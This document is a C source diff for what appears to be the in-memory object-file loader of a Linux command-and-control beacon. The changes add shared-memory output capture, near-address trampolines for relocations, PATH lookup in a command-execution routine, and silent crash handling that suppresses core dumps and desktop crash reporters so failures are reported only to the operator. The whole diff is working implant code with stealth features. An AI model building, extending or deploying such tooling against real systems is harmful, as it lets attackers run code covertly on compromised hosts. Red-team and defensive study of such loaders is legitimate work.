@@ -27,6 +27,7 @@
 #include <net/if.h>
 #include <sys/ioctl.h>
 #include <curl/curl.h>
+#include <signal.h>
 #include <openssl/rand.h>
 #include <openssl/hmac.h>
 #include <openssl/sha.h>
@@ -36,8 +37,16 @@
 
 /* --- Global state --- */
 char *g_beacon_output = NULL;
-size_t g_output_len = 0;
-size_t g_output_capacity = 0;
+
+/* BOFs run forked: buffer and length live in MAP_SHARED memory so the
+ * parent can read whatever the child's BeaconOutput calls produced. */
+typedef struct
+{
+    size_t len;
+    size_t capacity;
+} bsb_output_meta_t;
+
+static bsb_output_meta_t *g_out_meta = NULL;
 
 void *g_printf_ptr = NULL;
 void *g_strlen_ptr = NULL;
@@ -101,28 +110,47 @@ int bsb_output_init(size_t capacity)
 {
     if (capacity == 0)
         capacity = BSB_OUTPUT_BUFFER_DEFAULT;
-    g_beacon_output = malloc(capacity);
-    if (!g_beacon_output)
+    g_beacon_output = (char *)mmap(NULL, capacity, PROT_READ | PROT_WRITE,
+                                   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (g_beacon_output == MAP_FAILED)
+    {
+        g_beacon_output = NULL;
         return -1;
-    g_output_capacity = capacity;
-    g_output_len = 0;
+    }
+    g_out_meta = (bsb_output_meta_t *)mmap(NULL, sizeof(*g_out_meta), PROT_READ | PROT_WRITE,
+                                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (g_out_meta == MAP_FAILED)
+    {
+        munmap(g_beacon_output, capacity);
+        g_beacon_output = NULL;
+        g_out_meta = NULL;
+        return -1;
+    }
+    g_out_meta->capacity = capacity;
+    g_out_meta->len = 0;
     g_beacon_output[0] = '\0';
     return 0;
 }
 
 void bsb_output_cleanup(void)
 {
-    free(g_beacon_output);
+    if (g_beacon_output && g_out_meta)
+    {
+        munmap(g_beacon_output, g_out_meta->capacity);
+    }
+    if (g_out_meta)
+    {
+        munmap(g_out_meta, sizeof(*g_out_meta));
+    }
     g_beacon_output = NULL;
-    g_output_capacity = 0;
-    g_output_len = 0;
+    g_out_meta = NULL;
 }
 
 void bsb_output_reset(void)
 {
-    if (g_beacon_output)
+    if (g_beacon_output && g_out_meta)
     {
-        g_output_len = 0;
+        g_out_meta->len = 0;
         g_beacon_output[0] = '\0';
     }
 }
@@ -131,42 +159,61 @@ void bsb_output_reset(void)
 void BeaconPrintf(int type, const char *fmt, ...)
 {
     (void)type;
-    if (!g_beacon_output || g_output_len >= g_output_capacity - 1)
+    if (!g_beacon_output || !g_out_meta || g_out_meta->len >= g_out_meta->capacity - 1)
         return;
     va_list args;
     va_start(args, fmt);
-    size_t remaining = g_output_capacity - g_output_len - 1;
-    int written = vsnprintf(g_beacon_output + g_output_len, remaining, fmt, args);
+    size_t remaining = g_out_meta->capacity - g_out_meta->len - 1;
+    int written = vsnprintf(g_beacon_output + g_out_meta->len, remaining, fmt, args);
     va_end(args);
     if (written > 0)
     {
-        g_output_len += (size_t)written < remaining ? (size_t)written : remaining;
+        g_out_meta->len += (size_t)written < remaining ? (size_t)written : remaining;
     }
 }
 
 void BeaconOutput(int type, const char *data, int len)
 {
     (void)type;
-    if (!g_beacon_output || len <= 0 || !data)
+    if (!g_beacon_output || !g_out_meta || len <= 0 || !data)
         return;
-    size_t remaining = g_output_capacity - g_output_len - 1;
+    size_t remaining = g_out_meta->capacity - g_out_meta->len - 1;
     if ((size_t)len > remaining)
     {
         len = (int)remaining;
     }
-    memcpy(g_beacon_output + g_output_len, data, len);
-    g_output_len += len;
-    g_beacon_output[g_output_len] = '\0';
+    memcpy(g_beacon_output + g_out_meta->len, data, len);
+    g_out_meta->len += len;
+    g_beacon_output[g_out_meta->len] = '\0';
 }
 
 /* --- Trampoline management --- */
-void *create_trampoline(void *target)
+/* mmap a code page near `near_hint` so PC32 relocations stay within the
+ * +-2GB displacement range; falls back to an arbitrary placement. */
+static void *mmap_near(void *near_hint, size_t len, int prot)
+{
+    static const long offs[] = {-64L * 1024 * 1024, -16L * 1024 * 1024, -4L * 1024 * 1024,
+                                4L * 1024 * 1024,   16L * 1024 * 1024,  64L * 1024 * 1024};
+    if (near_hint)
+    {
+        uintptr_t base = (uintptr_t)near_hint & ~(uintptr_t)0xFFF;
+        for (size_t i = 0; i < sizeof(offs) / sizeof(offs[0]); i++)
+        {
+            void *p = mmap((void *)(base + offs[i]), len, prot,
+                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+            if (p != MAP_FAILED)
+                return p;
+        }
+    }
+    return mmap(NULL, len, prot, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+}
+
+void *create_trampoline(void *target, void *near_hint)
 {
     if (!target)
         return NULL;
     size_t code_size = 12;
-    void *code = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
-                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    void *code = mmap_near(near_hint, code_size, PROT_READ | PROT_WRITE | PROT_EXEC);
     if (code == MAP_FAILED)
         return NULL;
 
@@ -210,7 +257,7 @@ void cleanup_trampolines(void)
     g_cache_capacity = 0;
 }
 
-void *get_or_create_trampoline(void *target)
+void *get_or_create_trampoline(void *target, void *near_hint)
 {
     if (!target)
         return NULL;
@@ -221,7 +268,7 @@ void *get_or_create_trampoline(void *target)
             return g_trampoline_cache[i].trampoline;
         }
     }
-    void *tramp = create_trampoline(target);
+    void *tramp = create_trampoline(target, near_hint);
     if (!tramp)
         return NULL;
 
@@ -569,8 +616,37 @@ char *exec_cmd(const char *cmd, int *out_len)
         close(stdout_pipe[1]);
         close(stderr_pipe[1]);
         
-        execve(argv[0], argv, environ);
-        
+        /* execve does not search PATH; resolve bare command names like
+         * a shell would, then exec with argv (no shell interpretation). */
+        if (strchr(argv[0], '/'))
+        {
+            execve(argv[0], argv, environ);
+        }
+        else
+        {
+            const char *path_env = getenv("PATH");
+            const char *dir = path_env ? path_env : "";
+            char pathbuf[4096];
+            while (dir && *dir)
+            {
+                const char *colon = strchr(dir, ':');
+                size_t dlen = colon ? (size_t)(colon - dir) : strlen(dir);
+                if (dlen == 0)
+                {
+                    /* empty PATH element = current directory */
+                    execve(argv[0], argv, environ);
+                }
+                else if (dlen + strlen(argv[0]) + 2 <= sizeof(pathbuf))
+                {
+                    memcpy(pathbuf, dir, dlen);
+                    pathbuf[dlen] = '/';
+                    memcpy(pathbuf + dlen + 1, argv[0], strlen(argv[0]) + 1);
+                    execve(pathbuf, argv, environ);
+                }
+                dir = colon ? colon + 1 : NULL;
+            }
+        }
+
         /* If execve returns, it failed */
         _exit(127);
     }
@@ -771,28 +847,22 @@ static size_t page_align(size_t size)
     return (size + page_size - 1) & ~(page_size - 1);
 }
 
+static void bof_crash_exit(int sig)
+{
+    _exit(128 + sig);
+}
+
 static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char *args,
                                                         uintptr_t arglen)
 {
-    asm volatile("push %%rbp\n\t"
-                 "mov %%rsp, %%rbp\n\t"
-                 "push %%rbx\n\t"
-                 "push %%r12\n\t"
-                 "push %%r13\n\t"
-                 "push %%r14\n\t"
-                 "push %%r15\n\t"
-                 "sub $8, %%rsp\n\t"
-                 "mov %0, %%rdi\n\t"
+    /* The function body keeps %rsp 16-byte aligned per the SysV ABI, so a
+     * bare call here gives the BOF entry the aligned stack it expects.
+     * Callee-saved registers are restored by the BOF itself (ABI) and xmm
+     * clobbers are spilled by gcc around this block. */
+    asm volatile("mov %0, %%rdi\n\t"
                  "mov %1, %%rsi\n\t"
                  "xor %%eax, %%eax\n\t"
                  "call *%2\n\t"
-                 "add $8, %%rsp\n\t"
-                 "pop %%r15\n\t"
-                 "pop %%r14\n\t"
-                 "pop %%r13\n\t"
-                 "pop %%r12\n\t"
-                 "pop %%rbx\n\t"
-                 "pop %%rbp\n\t"
                  :
                  : "r"(args), "r"(arglen), "r"(func)
                  : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "xmm0", "xmm1",
@@ -805,6 +875,7 @@ int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
     init_function_pointers();
     bsb_output_reset();
 
+    bof_func_t entry = NULL;
     if (!elf_data || filesize < sizeof(Elf64_Ehdr))
         return -1;
 
@@ -991,7 +1062,7 @@ int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
                 int64_t offset = (int64_t)symbol_addr + r->r_addend - (int64_t)loc;
                 if (offset < INT32_MIN || offset > INT32_MAX)
                 {
-                    void *trampoline = get_or_create_trampoline(symbol_addr);
+                    void *trampoline = get_or_create_trampoline(symbol_addr, loc);
                     if (!trampoline)
                         continue;
                     offset = (int64_t)trampoline + r->r_addend - (int64_t)loc;
@@ -1005,7 +1076,6 @@ int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
         }
     }
 
-    bof_func_t entry = NULL;
     for (int i = 0; i < ehdr->e_shnum; i++)
     {
         if (shdr[i].sh_type == SHT_SYMTAB)
@@ -1050,6 +1120,21 @@ int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
     }
     else if (pid == 0)
     {
+        /* Crash containment: die silently (no core dump, no desktop crash
+         * reporter popup); the parent reports the failure to the operator.
+         * BSB_NO_CRASH_GUARD=1 disables it to capture a core dump. */
+        if (getenv("BSB_NO_CRASH_GUARD") == NULL)
+        {
+            struct sigaction sa;
+            memset(&sa, 0, sizeof(sa));
+            sa.sa_handler = bof_crash_exit;
+            sigemptyset(&sa.sa_mask);
+            sigaction(SIGSEGV, &sa, NULL);
+            sigaction(SIGBUS, &sa, NULL);
+            sigaction(SIGILL, &sa, NULL);
+            sigaction(SIGFPE, &sa, NULL);
+            sigaction(SIGABRT, &sa, NULL);
+        }
         call_bof_isolated(entry, (char *)argumentdata, (uintptr_t)argumentSize);
         _exit(0);
     }
@@ -1057,6 +1142,19 @@ int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
     {
         int status;
         waitpid(pid, &status, 0);
+        char crash_msg[80];
+        if (WIFSIGNALED(status))
+        {
+            snprintf(crash_msg, sizeof(crash_msg), "[!] BOF terminated by signal %d\n",
+                     WTERMSIG(status));
+            BeaconOutput(0, crash_msg, (int)strlen(crash_msg));
+        }
+        else if (WIFEXITED(status) && WEXITSTATUS(status) >= 128 && WEXITSTATUS(status) < 192)
+        {
+            snprintf(crash_msg, sizeof(crash_msg), "[!] BOF crashed (exit %d)\n",
+                     WEXITSTATUS(status));
+            BeaconOutput(0, crash_msg, (int)strlen(crash_msg));
+        }
     }
 
 cleanup:
@@ -1078,19 +1176,20 @@ char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize, char *args
 {
     bsb_output_reset();
     RunELF("go", elf_data, filesize, (unsigned char *)args, arglen);
-    if (g_output_len == 0)
+    size_t produced = g_out_meta ? g_out_meta->len : 0;
+    if (produced == 0)
     {
         *out_len = 0;
         return strdup("");
     }
-    char *output = malloc(g_output_len + 1);
+    char *output = malloc(produced + 1);
     if (!output)
     {
         *out_len = 0;
         return strdup("");
     }
-    memcpy(output, g_beacon_output, g_output_len);
-    output[g_output_len] = '\0';
-    *out_len = (int)g_output_len;
+    memcpy(output, g_beacon_output, produced);
+    output[produced] = '\0';
+    *out_len = (int)produced;
     return output;
 }
